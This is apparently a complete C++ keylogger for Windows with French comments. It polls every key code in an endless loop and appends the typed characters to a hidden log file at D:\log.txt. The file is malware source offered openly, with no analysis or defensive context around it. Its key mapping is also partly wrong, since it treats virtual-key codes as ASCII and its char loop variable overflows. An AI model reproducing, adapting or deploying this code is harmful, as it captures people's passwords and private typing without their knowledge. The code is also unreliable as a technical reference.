#include <iostream>
#include <windows.h>
#include <fstream>
#include <string.h>
#include <unistd.h>

#define FICHIER_SAUVEGARDE "D:\\log.txt"

using namespace std;

/**
 * Va sauvegarder le paramettre texte dans
 */
void Save(LPCSTR text) {
	ofstream writter;
	writter.open(FICHIER_SAUVEGARDE, ofstream::app);
	writter << text;
	writter.close();
}

/**
 * Symbolise l'id d'une touche (utile pour les touches speciales comme les clics de la souris, touche espace, etc)
 */
void Traitement(int p_id_touche_clavier) {
	cout << p_id_touche_clavier << endl;
	switch (p_id_touche_clavier) {
	case 1:
		//Save("[clic gauche]");
		break;
	case 2:
		//Save("[clic droit]");
		break;
	case 8:
		Save("[<--]");
		break;
	case 13:
		Save("[entree]\n");
		break;
	case 32:
		Save(" ");
		break;
	case 37:
		Save("[<-]");
		break;
	case 38:
		Save("[<|]");
		break;
	case 39:
		Save("[->]");
		break;
	case 40:
		Save("[|>]");
		break;
	case 48:
		Save("0");
		break;
	case 49:
		Save("1");
		break;
	case 50:
		Save("2");
		break;
	case 51:
		Save("3");
		break;
	case 52:
		Save("4");
		break;
	case 53:
		Save("5");
		break;
	case 54:
		Save("6");
		break;
	case 55:
		Save("7");
		break;
	case 56:
		Save("8");
		break;
	case 57:
		Save("9");
		break;
	case 58:
		Save(":");
		break;
	case 59:
		Save(";");
		break;
	case 60:
		Save("<");
		break;
	case 61:
		Save("=");
		break;
	case 62:
		Save(">");
		break;
	case 63:
		Save("?");
		break;
	case 64:
		Save("@");
		break;
	case 65:
		Save("A");
		break;
	case 66:
		Save("B");
		break;
	case 67:
		Save("C");
		break;
	case 68:
		Save("D");
		break;
	case 69:
		Save("E");
		break;
	case 70:
		Save("F");
		break;
	case 71:
		Save("G");
		break;
	case 72:
		Save("H");
		break;
	case 73:
		Save("I");
		break;
	case 74:
		Save("J");
		break;
	case 75:
		Save("K");
		break;
	case 76:
		Save("L");
		break;
	case 77:
		Save("M");
		break;
	case 78:
		Save("N");
		break;
	case 79:
		Save("O");
		break;
	case 80:
		Save("P");
		break;
	case 81:
		Save("Q");
		break;
	case 82:
		Save("R");
		break;
	case 83:
		Save("S");
		break;
	case 84:
		Save("T");
		break;
	case 85:
		Save("U");
		break;
	case 86:
		Save("V");
		break;
	case 87:
		Save("W");
		break;
	case 88:
		Save("X");
		break;
	case 89:
		Save("Y");
		break;
	case 90:
		Save("Z");
		break;
	case 91:
		Save("[");
		break;
	case 92:
		Save("\"");
		break;
	case 93:
		Save("]");
		break;
	case 94:
		Save("^");
		break;
	case 95:
		Save("_");
		break;
	case 96:
		Save("`");
		break;
	case 97:
		Save("a");
		break;
	case 98:
		Save("b");
		break;
	case 99:
		Save("c");
		break;
	case 100:
		Save("d");
		break;
	case 101:
		Save("e");
		break;
	case 102:
		Save("f");
		break;
	case 103:
		Save("g");
		break;
	case 104:
		Save("h");
		break;
	case 105:
		Save("i");
		break;
	case 106:
		Save("j");
		break;
	case 107:
		Save("k");
		break;
	case 108:
		Save("l");
		break;
	case 109:
		Save("m");
		break;
	case 110:
		Save("n");
		break;
	case 111:
		Save("o");
		break;
	case 112:
		Save("p");
		break;
	case 113:
		Save("q");
		break;
	case 114:
		Save("r");
		break;
	case 115:
		Save("s");
		break;
	case 116:
		Save("t");
		break;
	case 117:
		Save("u");
		break;
	case 118:
		Save("v");
		break;
	case 119:
		Save("w");
		break;
	case 120:
		Save("x");
		break;
	case 121:
		Save("y");
		break;
	case 122:
		Save("z");
		break;
	case 123:
		Save("{");
		break;
	case 124:
		Save("|");
		break;
	case 125:
		Save("}");
		break;
	case 126:
		Save("~");
		break;
	case 127:
		Save("");
		break;
	case 128:
		Save("?");
		break;
	case 129:
		Save("?");
		break;
	case 130:
		Save("?");
		break;
	case 131:
		Save("?");
		break;
	case 132:
		Save("?");
		break;
	case 133:
		Save("?");
		break;
	case 134:
		Save("?");
		break;
	case 135:
		Save("?");
		break;
	case 136:
		Save("?");
		break;
	case 137:
		Save("?");
		break;
	case 138:
		Save("?");
		break;
	case 139:
		Save("?");
		break;
	case 140:
		Save("?");
		break;
	case 141:
		Save("?");
		break;
	case 142:
		Save("?");
		break;
	case 143:
		Save("?");
		break;
	case 144:
		Save("?");
		break;
	case 145:
		Save("?");
		break;
	case 146:
		Save("?");
		break;
	case 147:
		Save("?");
		break;
	case 148:
		Save("?");
		break;
	case 149:
		Save("?");
		break;
	case 150:
		Save("?");
		break;
	case 151:
		Save("?");
		break;
	case 152:
		Save("?");
		break;
	case 153:
		Save("?");
		break;
	case 154:
		Save("?");
		break;
	case 155:
		Save("?");
		break;
	case 156:
		Save("?");
		break;
	case 157:
		Save("?");
		break;
	case 158:
		Save("?");
		break;
	case 159:
		Save("?");
		break;
	case 160:
		Save(" ");
		break;
	case 161:
		Save("¡");
		break;
	case 162:
		Save("¢");
		break;
	case 163:
		Save("£");
		break;
	case 164:
		Save("¤");
		break;
	case 165:
		Save("¥");
		break;
	case 166:
		Save("¦");
		break;
	case 167:
		Save("§");
		break;
	case 168:
		Save("¨");
		break;
	case 169:
		Save("©");
		break;
	case 170:
		Save("ª");
		break;
	case 171:
		Save("«");
		break;
	case 172:
		Save("¬");
		break;
	case 173:
		Save("­");
		break;
	case 174:
		Save("®");
		break;
	case 175:
		Save("¯");
		break;
	case 176:
		Save("°");
		break;
	case 177:
		Save("±");
		break;
	case 178:
		Save("²");
		break;
	case 179:
		Save("³");
		break;
	case 180:
		Save("´");
		break;
	case 181:
		Save("µ");
		break;
	case 182:
		Save("¶");
		break;
	case 183:
		Save("·");
		break;
	case 184:
		Save("¸");
		break;
	case 185:
		Save("¹");
		break;
	case 186:
		Save("º");
		break;
	case 187:
		Save("»");
		break;
	case 188:
		Save("¼");
		break;
	case 189:
		Save("½");
		break;
	case 190:
		Save("¾");
		break;
	case 191:
		Save("¿");
		break;
	case 192:
		Save("À");
		break;
	case 193:
		Save("Á");
		break;
	case 194:
		Save("Â");
		break;
	case 195:
		Save("Ã");
		break;
	case 196:
		Save("Ä");
		break;
	case 197:
		Save("Å");
		break;
	case 198:
		Save("Æ");
		break;
	case 199:
		Save("Ç");
		break;
	case 200:
		Save("È");
		break;
	case 201:
		Save("É");
		break;
	case 202:
		Save("Ê");
		break;
	case 203:
		Save("Ë");
		break;
	case 204:
		Save("Ì");
		break;
	case 205:
		Save("Í");
		break;
	case 206:
		Save("Î");
		break;
	case 207:
		Save("Ï");
		break;
	case 208:
		Save("Ð");
		break;
	case 209:
		Save("Ñ");
		break;
	case 210:
		Save("Ò");
		break;
	case 211:
		Save("Ó");
		break;
	case 212:
		Save("Ô");
		break;
	case 213:
		Save("Õ");
		break;
	case 214:
		Save("Ö");
		break;
	case 215:
		Save("×");
		break;
	case 216:
		Save("Ø");
		break;
	case 217:
		Save("Ù");
		break;
	case 218:
		Save("Ú");
		break;
	case 219:
		Save("Û");
		break;
	case 220:
		Save("Ü");
		break;
	case 221:
		Save("Ý");
		break;
	case 222:
		Save("Þ");
		break;
	case 223:
		Save("ß");
		break;
	case 224:
		Save("à");
		break;
	case 225:
		Save("á");
		break;
	case 226:
		Save("â");
		break;
	case 227:
		Save("ã");
		break;
	case 228:
		Save("ä");
		break;
	case 229:
		Save("å");
		break;
	case 230:
		Save("æ");
		break;
	case 231:
		Save("ç");
		break;
	case 232:
		Save("è");
		break;
	case 233:
		Save("é");
		break;
	case 234:
		Save("ê");
		break;
	case 235:
		Save("ë");
		break;
	case 236:
		Save("ì");
		break;
	case 237:
		Save("í");
		break;
	case 238:
		Save("î");
		break;
	case 239:
		Save("ï");
		break;
	case 240:
		Save("ð");
		break;
	case 241:
		Save("ñ");
		break;
	case 242:
		Save("ò");
		break;
	case 243:
		Save("ó");
		break;
	case 244:
		Save("ô");
		break;
	case 245:
		Save("õ");
		break;
	case 246:
		Save("ö");
		break;
	case 247:
		Save("÷");
		break;
	case 248:
		Save("ø");
		break;
	case 249:
		Save("ù");
		break;
	case 250:
		Save("ú");
		break;
	case 251:
		Save("û");
		break;
	case 252:
		Save("ü");
		break;
	case 253:
		Save("ý");
		break;
	case 254:
		Save("þ");
		break;
	case 255:
		Save("ÿ");
		break;
	default:
		break;
	}
}

int main() {
	char touche_clavier;
	Sleep(100);
	while (TRUE) {
		for (touche_clavier = 1; touche_clavier <= 255; touche_clavier++) { //Pour toute les touches du clavier
			if (GetAsyncKeyState(touche_clavier) == -32767) { //Si une touche est saisie
				Traitement(touche_clavier);
			}
		}
	}
}
